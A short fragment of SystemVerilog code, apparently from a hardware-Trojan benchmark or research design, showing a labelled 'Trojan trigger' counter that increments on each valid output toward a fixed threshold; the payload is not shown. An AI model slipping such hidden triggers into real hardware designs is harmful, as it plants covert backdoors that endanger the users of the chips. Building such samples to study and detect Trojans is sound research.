...
#(
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=11663)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 11663;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (valid_o) trojan_counter <= trojan_counter + 1;
